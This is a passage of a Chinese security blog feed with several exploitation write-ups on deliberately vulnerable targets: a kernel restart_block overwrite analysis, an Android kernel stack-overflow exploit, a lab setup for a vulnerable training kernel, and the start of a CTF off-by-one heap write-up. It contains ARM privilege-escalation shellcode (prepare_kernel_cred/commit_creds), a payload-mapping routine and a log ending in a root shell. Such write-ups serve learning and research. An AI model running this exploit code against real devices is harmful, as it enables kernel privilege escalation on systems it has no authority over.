    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>说实话这个题目还是没有出来,但是我认为该题应该是vmlinux的一些问题,我试了比较久,一直不能让restart_block击中题目特别设置的0x9e3779b9,感觉应该是我编译的vmlinux没有开启cannay,一个函数的栈的大小和原题应该有出入之类导致的,(估计是我比较菜啦),但是这道题目的主要内容还是学到了的,这里给出我的分析.</p><h3 id="关于内核栈"><a href="#关于内核栈" class="headerlink" title="关于内核栈"></a>关于内核栈</h3><p>在Linux上，系统上的每个线程都在内核内存中分配了相应的内核堆栈。x86上的Linux内核堆栈大小为4096或8192字节，因为有些程序需要从用户态进入内核态,当发生转换的时候,栈也会随着从用户栈转移为内核栈,而内核栈的结构如下图所示:<br><img src="/img/kstack.png" alt="我是图片"><br>因为内核栈比较小,所以非常容易溢出,如下图所示:<br><img src="/img/kstack-smash.png" alt="我是图片"><br>tread_info的结构体如下:<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span>  *<span class="title">task</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">exec_domain</span>  *<span class="title">exec_domain</span>;</span></span><br><span class="line">    __u32                flags;</span><br><span class="line">    __u32                status;</span><br><span class="line">    __u32                cpu;</span><br><span class="line">    <span class="keyword">int</span>                  preempt_count;</span><br><span class="line">    <span class="keyword">mm_segment_t</span>         addr_limit;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">restart_block</span> <span class="title">restart_block</span>;</span></span><br><span class="line">    <span class="keyword">void</span> __user         *sysenter_return;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_X86_32</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span>        previous_esp;</span><br><span class="line">    __u8                 supervisor_stack[<span class="number">0</span>];</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">int</span>                  uaccess_err;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p><p>作用是啥,因为thread_info很大,里面保存了restart_block指针,如果我们能溢出restart_block指针的值的话就可以通过如下调用来直接转入我们的函数执行:<br>restart_block的结构体如下:<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">restart_block</span> &#123;</span></span><br><span class="line">    <span class="keyword">long</span> (*fn)(struct restart_block *);</span><br><span class="line">    <span class="keyword">union</span> &#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">            ...</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">/* For futex_wait and futex_wait_requeue_pi */</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">            ...</span><br><span class="line">        &#125; futex;</span><br><span class="line">        <span class="comment">/* For nanosleep */</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">            ...</span><br><span class="line">        &#125; nanosleep;</span><br><span class="line">        <span class="comment">/* For poll */</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">            ...</span><br><span class="line">        &#125; poll;</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p><p>restart_syscall的定义如下,发现其实调用了restart_block的fn指针作为函数来执行.<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">SYSCALL_DEFINE0(restart_syscall)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">restart_block</span> *<span class="title">restart</span> = &amp;<span class="title">current_thread_info</span>()-&gt;<span class="title">restart_block</span>;</span></span><br><span class="line">    <span class="keyword">return</span> restart-&gt;fn(restart);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>所以我们只需要调用syscall(SYS_restart_syscall);就能执行我们溢出的指针值了.</p><h3 id="关于gdb调试内核的一些操作"><a href="#关于gdb调试内核的一些操作" class="headerlink" title="关于gdb调试内核的一些操作"></a>关于gdb调试内核的一些操作</h3><h4 id="通过info-stack来查看堆栈"><a href="#通过info-stack来查看堆栈" class="headerlink" title="通过info stack来查看堆栈"></a>通过info stack来查看堆栈</h4><p><img src="/img/info_stack.png" alt="我是图片"></p><h4 id="通过如下操作查看当前内核栈中的thread-info结构体"><a href="#通过如下操作查看当前内核栈中的thread-info结构体" class="headerlink" title="通过如下操作查看当前内核栈中的thread_info结构体."></a>通过如下操作查看当前内核栈中的thread_info结构体.</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print  *((struct thread_info*)(((<span class="keyword">uint32_t</span>)$sp &amp; <span class="number">0xffffe000</span>)))</span><br></pre></td></tr></table></figure><p><img src="/img/thread_info.png" alt="我是图片"></p><h4 id="通过如下操作查看restart-block的结构体"><a href="#通过如下操作查看restart-block的结构体" class="headerlink" title="通过如下操作查看restart_block的结构体"></a>通过如下操作查看restart_block的结构体</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print  ((struct thread_info*)(((<span class="keyword">uint32_t</span>)$sp &amp; <span class="number">0xffffe000</span>)))-&gt;restart_block</span><br></pre></td></tr></table></figure><p><img src="/img/restart_block.png" alt="我是图片"></p><h4 id="关于mmap申请一块内存"><a href="#关于mmap申请一块内存" class="headerlink" title="关于mmap申请一块内存"></a>关于mmap申请一块内存</h4><p>mmap的原型如下:<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">mmap</span><span class="params">(<span class="keyword">void</span> *start, <span class="keyword">size_t</span> length, <span class="keyword">int</span> prot, <span class="keyword">int</span> flags, <span class="keyword">int</span> fd, <span class="keyword">off_t</span> offset)</span></span>;</span><br></pre></td></tr></table></figure></p><p>mmap是一种内存映射文件的方法，即将一个文件或者其它对象映射到进程的地址空间，实现文件磁盘地址和进程虚拟地址空间中一段虚拟地址的一一对映关系。实现这样的映射关系后，进程就可以采用指针的方式读写操作这一段内存，而系统会自动回写脏页面到对应的文件磁盘上，即完成了对文件的操作而不必再调用read,write等系统调用函数。相反，内核空间对这段区域的修改也直接反映用户空间，从而可以实现不同进程间的文件共享。如下图所示：<br><img src="/img/mmap.png" alt="我是图片"><br>linux内核使用vm_area_struct结构来表示一个独立的虚拟内存区域，由于每个不同质的虚拟内存区域功能和内部机制都不同，因此一个进程使用多个vm_area_struct结构来分别表示不同类型的虚拟内存区域。各个vm_area_struct结构使用链表或者树形结构链接，方便进程快速访问，如下图所示：<br><img src="/img/vm_area_struct.png" alt="我是图片"><br>在题解中,使用了如下的代码进行内存的分配:<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span></span><br><span class="line">setup_payload(<span class="keyword">unsigned</span> addr)</span><br><span class="line">&#123;</span><br><span class="line">        <span class="comment">/* asm(mov $addr, %eax; jmp *%eax); is 7 bytes wide */</span></span><br><span class="line">        <span class="keyword">unsigned</span> size = <span class="number">7</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">unsigned</span> round_addr = addr &amp; PAGE_MASK;</span><br><span class="line">        <span class="keyword">unsigned</span> diff       = addr - round_addr;</span><br><span class="line">        <span class="keyword">unsigned</span> len        = (size + diff + (PAGE_SIZE - <span class="number">1</span>)) &amp; PAGE_MASK;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">char</span> *buf = mmap((<span class="keyword">void</span> *)round_addr, len, PROT_READ|PROT_WRITE|PROT_EXEC,</span><br><span class="line">                        MAP_FIXED|MAP_ANONYMOUS|MAP_PRIVATE, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (buf == MAP_FAILED)</span><br><span class="line">                err(<span class="number">1</span>, <span class="string">"mmap"</span>);</span><br><span class="line"></span><br><span class="line">        generate_shellcode(buf + diff);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"[+] Payload set\n"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>因为使用mmap需要注意的一个关键点是，mmap映射区域大小必须是物理页大小(page_size)的整倍数（32位系统中通常是4k字节）。原因是，内存的最小粒度是页，而进程虚拟地址空间和内存的映射也是以页为单位。为了匹配内存的操作，mmap从磁盘到虚拟地址空间的映射也必须是页。</p><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://www.cnblogs.com/huxiao-tee/p/4660352.html" target="_blank" rel="noopener">https://www.cnblogs.com/huxiao-tee/p/4660352.html</a><br><a href="http://jon.oberheide.org/blog/2010/11/29/exploiting-stack-overflows-in-the-linux-kernel/" target="_blank" rel="noopener">http://jon.oberheide.org/blog/2010/11/29/exploiting-stack-overflows-in-the-linux-kernel/</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;说实话这个题目还是没有出来,但是我认为该题应该是vmlinux的一些问题,我试了比较久,一直不能让restart_block击中题目特别设置
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Linux Kernel Exploitation on Android-Stack Buffer overflow</title>
    <link href="https://foyjog.github.io/2018/06/27/Linux-Kernel-Exploitation-on-Android-Stack-Buffer-overflow/"/>
    <id>https://foyjog.github.io/2018/06/27/Linux-Kernel-Exploitation-on-Android-Stack-Buffer-overflow/</id>
    <published>2018-06-27T08:05:40.000Z</published>
    <updated>2018-07-03T08:18:18.685Z</updated>
    
    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>昨天搭建好了环境,那么开始最简单的一个exploit.即:Stack Buffer overflow.<br>我这里下载的是r10版本的ndk-build进行编译.</p><h3 id="开始"><a href="#开始" class="headerlink" title="开始"></a>开始</h3><p>模块并没有开canary,所以canany的获取是无效的.<br>在进行调试之前记得要开kptr_restrict<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb shell  &quot;echo 0 &gt; /proc/sys/kernel/kptr_restrict&quot;</span><br></pre></td></tr></table></figure></p><p>这里面该exploit其实很好懂,一个简单的栈溢出,没有canary,通过覆盖驱动的返回地址就能实现提权,(当然这在新的安卓系统中是完全不可行的,SMAP,PAN等等机制阻拦当前安卓内核的提权)</p><p>这里稍微注释一下我遇到的问题所在:<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">// commit_creds(prepare_kernel_cred(0));</span></span><br><span class="line"><span class="comment">// -&gt; get root</span></span><br><span class="line"><span class="string">"LDR     R3, =0xc0039d34\n\t"</span><span class="comment">//prepare_kernel_cred</span></span><br><span class="line"><span class="string">"MOV     R0, ####0\n\t"</span></span><br><span class="line"><span class="string">"BLX     R3\n\t"</span></span><br><span class="line"><span class="string">"LDR     R3, =0xc0039834\n\t"</span><span class="comment">//commit_creds</span></span><br><span class="line"><span class="string">"BLX     R3\n\t"</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//Fix the trashed stack by restoring r4/r5 from duped values on the stack</span></span><br><span class="line"><span class="string">"ldr r0, =0xc00fa4a4\t\n"</span></span><br><span class="line"><span class="string">"ldr r4, [sp] \t\n"</span></span><br><span class="line"><span class="string">"ldr r5, [sp, ####4]\t\n"</span></span><br><span class="line"><span class="string">"bx r0\t\n"</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure></p><p>这里面r3的地址要自己根据实际的情况具体赋值<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">found kernel symbols as follows:</span><br><span class="line">prepare_kernel_cred:<span class="number">0xc0039d34</span></span><br><span class="line">commit_creds:<span class="number">0xc0039834</span></span><br><span class="line">proc_file_write:<span class="number">0xc00fa3f8</span></span><br></pre></td></tr></table></figure></p><p>r1的值其实是proc_entry_write()的返回地址,这通过断点在r1的值其实是proc_entry_write的时通过bt查看即可.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ bt</span><br><span class="line">####<span class="number">0</span>  proc_entry_write (file=<span class="number">0xedb6e380</span>, ubuf=<span class="number">0xbee24a74</span> <span class="string">'A'</span> &lt;repeats <span class="number">68</span> times&gt;, <span class="string">"\234\201"</span>, count=<span class="number">0x48</span>, data=<span class="number">0x0</span>)</span><br><span class="line">    at drivers/vulnerabilities/kernel_build/../challenges/stack_buffer_overflow/<span class="keyword">module</span>/stack_buffer_overflow.c:<span class="number">17</span></span><br><span class="line">####1  0xc00fa4a4 in proc_file_write (file=0xedb6e380, buffer=0xbee24a74 'A' &lt;repeats 68 times&gt;, "\234\201", count=0x48, ppos=&lt;optimized out&gt;) at fs/proc/generic.c:225</span><br><span class="line">####2  0xc00f5b54 in proc_reg_write (file=0xedb6e380, buf=0xbee24a74 'A' &lt;repeats 68 times&gt;, "\234\201", count=0x48, ppos=0xed9a5f88) at fs/proc/inode.c:218</span><br><span class="line">####3  0xc00aff70 in vfs_write (file=0xedb6e380, buf=0xbee24a74 'A' &lt;repeats 68 times&gt;, "\234\201", count=0x48, pos=0xed9a5f88) at fs/read_write.c:435</span><br><span class="line">####4  0xc00b0084 in sys_write (fd=&lt;optimized out&gt;, buf=&lt;optimized out&gt;, count=0x48) at fs/read_write.c:487</span><br><span class="line">####<span class="number">5</span>  <span class="number">0xc000d680</span> in ?? ()</span><br><span class="line">####<span class="number">6</span>  <span class="number">0xc000d680</span> in ?? ()</span><br><span class="line">Backtrace stopped: <span class="function">previous frame identical to <span class="keyword">this</span> <span class="title">frame</span> <span class="params">(corrupt <span class="built_in">stack</span>?)</span></span></span><br></pre></td></tr></table></figure><p>可以得出0xc00fa4a4 in proc_file_write()就是我们想要返回的地址,因为如果直接返回到用户模式要执行IRET指令,需要一系列的操作,所以这里就正常返回,让内核去做这件事情就可以了.</p><p>最后得到shell:<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">!master ~/Documents/Andorid_Fuzz/kernel_exploit_challenges/challenges/stack_buffer_overflow/solution&gt; ./build_and_run.sh</span><br><span class="line">[armeabi] Compile thumb  : stack_buffer_overflow_exploit &lt;= stack_buffer_overflow_exploit.c</span><br><span class="line">[armeabi] Executable     : stack_buffer_overflow_exploit</span><br><span class="line">[armeabi] Install        : stack_buffer_overflow_exploit =&gt; libs/armeabi/stack_buffer_overflow_exploit</span><br><span class="line">./libs/armeabi/stack_buffer_overflow_exploit: <span class="number">1</span> file pushed. <span class="number">1.8</span> MB/s (<span class="number">64068</span> bytes in <span class="number">0.034</span>s)</span><br><span class="line">found kernel symbols as follows:</span><br><span class="line">prepare_kernel_cred:<span class="number">0xc0039d34</span></span><br><span class="line">commit_creds:<span class="number">0xc0039834</span></span><br><span class="line">proc_file_write0xc00fa3f8</span><br><span class="line">[+] found canary: <span class="number">00020002</span></span><br><span class="line">[+] enjoy the shell</span><br><span class="line">root@generic:/ ### ls</span><br><span class="line">ls</span><br><span class="line">acct</span><br><span class="line">config</span><br><span class="line">d</span><br><span class="line">data</span><br><span class="line"><span class="keyword">default</span>.prop</span><br><span class="line">dev</span><br><span class="line">etc</span><br><span class="line">file_contexts</span><br><span class="line">fstab.goldfish</span><br><span class="line">fstab.ranchu</span><br><span class="line">init</span><br><span class="line">init.environ.rc</span><br><span class="line">init.goldfish.rc</span><br><span class="line">init.ranchu.rc</span><br><span class="line">init.rc</span><br><span class="line">init.trace.rc</span><br><span class="line">init.usb.rc</span><br><span class="line">mnt</span><br><span class="line">proc</span><br><span class="line">property_contexts</span><br><span class="line">root</span><br><span class="line">sbin</span><br><span class="line">sdcard</span><br><span class="line">seapp_contexts</span><br><span class="line">sepolicy</span><br><span class="line">storage</span><br><span class="line">sys</span><br><span class="line">system</span><br><span class="line">ueventd.goldfish.rc</span><br><span class="line">ueventd.ranchu.rc</span><br><span class="line">ueventd.rc</span><br><span class="line">vendor</span><br><span class="line">root@generic:/ ### ^C</span><br><span class="line"><span class="built_in">exit</span> <span class="number">130</span></span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;昨天搭建好了环境,那么开始最简单的一个exploit.即:Stack Buffer overflow.&lt;br&gt;我这里下载的是r10版本的nd
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Linux Kernel Exploitation on Android环境搭建(mac os)</title>
    <link href="https://foyjog.github.io/2018/06/26/Linux-Kernel-Exploitation-on-Android%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA-mac-os/"/>
    <id>https://foyjog.github.io/2018/06/26/Linux-Kernel-Exploitation-on-Android环境搭建-mac-os/</id>
    <published>2018-06-26T08:01:24.000Z</published>
    <updated>2018-07-03T08:18:24.201Z</updated>
    
    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>在公司要开始做安卓的内核漏洞挖掘,在网上找到一个android的漏洞挖掘环境靶场,废话不多,先搭环境先.<br>项目的地址:<a href="https://github.com/Fuzion24/AndroidKernelExploitationPlayground" target="_blank" rel="noopener">https://github.com/Fuzion24/AndroidKernelExploitationPlayground</a></p><h3 id="开始"><a href="#开始" class="headerlink" title="开始"></a>开始</h3><p>阅读readme,发现基本上手把手教学,按照流程走一波基本上ok.但是这里有个问题的是<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">android create avd --force -t <span class="string">"Google Inc.:Google APIs:19"</span> -n kernel_challenges</span><br></pre></td></tr></table></figure></p><p>无法成功,自己捣鼓了一下,以下流程可以获得成功.</p><p>打开android studio,利用avd manager创建一个api为19的nexes 5x.<br><img src="/img/1.png" alt="我是图片"><br>打开sdk-manager,安装如下的东西:<br><img src="/img/2.png" alt="我是图片"><br>保证emulator等版本对上,保证将其加入环境变量等操作.(我下了一个比较早的sdk版本,替换了最新的emulator)<br><img src="/img/3.png" alt="我是图片"></p><p>还有如下的操作:<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp elfutils/<span class="number">0.153</span>/libelf/elf.h /usr/local/include</span><br></pre></td></tr></table></figure></p><p>将0.153删除,之后编译的时候还会提示缺少很多头文件,我们去ubuntu的目录下去寻找即可.<br>然后按照教程执行:<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">emulator -show-kernel -kernel arch/arm/boot/zImage -avd Nexus_5X_API_19 -no-boot-anim -no-skin -no-audio -no-window -qemu -monitor unix:/tmp/qemuSocket,server,nowait -s</span><br></pre></td></tr></table></figure></p><p><img src="/img/4.png" alt="我是图片"><br>可以看到环境已经启动.terminal中输入adb shell,输入ls /proc, 发现stack_buffer_overflow的存在<br><img src="/img/5.png" alt="我是图片"><br>输入<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot; &gt; /proc/stack_buffer_overflow</span><br></pre></td></tr></table></figure></p><p>发现系统内核崩溃.<br><img src="/img/6.png" alt="我是图片"></p><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://stackoverflow.com/questions/7412548/error-gnu-stubs-32-h-no-such-file-or-directory-while-compiling-nachos-source" target="_blank" rel="noopener">https://stackoverflow.com/questions/7412548/error-gnu-stubs-32-h-no-such-file-or-directory-while-compiling-nachos-source</a><br><a href="https://github.com/Fuzion24/AndroidKernelExploitationPlayground/blob/master/Readme.md" target="_blank" rel="noopener">https://github.com/Fuzion24/AndroidKernelExploitationPlayground/blob/master/Readme.md</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;在公司要开始做安卓的内核漏洞挖掘,在网上找到一个android的漏洞挖掘环境靶场,废话不多,先搭环境先.&lt;br&gt;项目的地址:&lt;a href=
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Asis CTF 2016 b00ks</title>
    <link href="https://foyjog.github.io/2018/06/21/Asis-CTF-2016-b00ks/"/>
    <id>https://foyjog.github.io/2018/06/21/Asis-CTF-2016-b00ks/</id>
    <published>2018-06-21T15:25:12.000Z</published>
    <updated>2018-07-03T08:17:40.825Z</updated>
    
    <content type="html"><![CDATA[<h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><p>这道题目的考察点是off-by-one,其实具体来讲是一个堆溢出，只不过这个堆溢出只能溢出一个字节而已，但是通过这一个字节就能导致能够构建一个堆上的fake trunk，从而进行一个任意地址的读写操作。</p><h3 id="整体操作"><a href="#整体操作" class="headerlink" title="整体操作"></a>整体操作</h3><p>程序其实很好看懂，是一个图书管理系统。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> __<span class="function">fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 _20; <span class="comment">// [rsp+20h] [rbp+0h]</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0L</span>L, <span class="number">2</span>, <span class="number">0L</span>L);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0L</span>L, <span class="number">1</span>, <span class="number">0L</span>L);</span><br><span class="line">  print_welcome();</span><br><span class="line">  read_author_name();</span><br><span class="line">  <span class="keyword">while</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)read_choice() != <span class="number">6</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">switch</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)&amp;_20 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1u</span>:</span><br><span class="line">        create_book();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2u</span>:</span><br><span class="line">        delete_book();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3u</span>:</span><br><span class="line">        edit_book();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4u</span>:</span><br><span class="line">        print_book_detail();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">5u</span>:</span><br><span class="line">        read_author_name();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"Wrong option"</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Thanks to use our library software"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>我们只要抓住如下几个点，通过这几个点就能实现getshell。</p><p>bss段上的author_name可以实现off_by_one的效果。通过多写一个字节，可以进行对p_books_array的第一个book地址的泄露和对第一个book地址的最低字节的置零操作。这是整个exploit的核心。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.bss:0000558FB73B2040 author_name     db 20h dup(?)           ; DATA XREF: .data:p_author_name_0↑o</span><br><span class="line">.bss:0000558FB73B2060 books_arry      dq ?                    ; DATA XREF: .data:p_books_array↑o</span><br></pre></td></tr></table></figure></p><p>如果将books_array的第一个book地址的最低字节进行置零操作，修改后的地址指向了原book的decription的堆区域，而description是可以任由我们构造的，通过read_by_data_len()函数可以输入任意字节，同0在内。其实题目是故意这么给的。description的区域也是故意给到了book的低字节处，好让我们能够自由构造一个desciption的。所以这道题目的故意点还是挺多了，没有这些点， 我们就无法利用off_by_one这个漏洞拿到shell。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">signed</span> __int64 __<span class="function">fastcall <span class="title">read_by_data_len</span><span class="params">(_BYTE *a1, <span class="keyword">int</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+14h] [rbp-Ch]</span></span><br><span class="line">  _BYTE *buf; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( a2 &lt;= <span class="number">0</span> )</span><br><span class="line">    <span class="keyword">return</span> <span 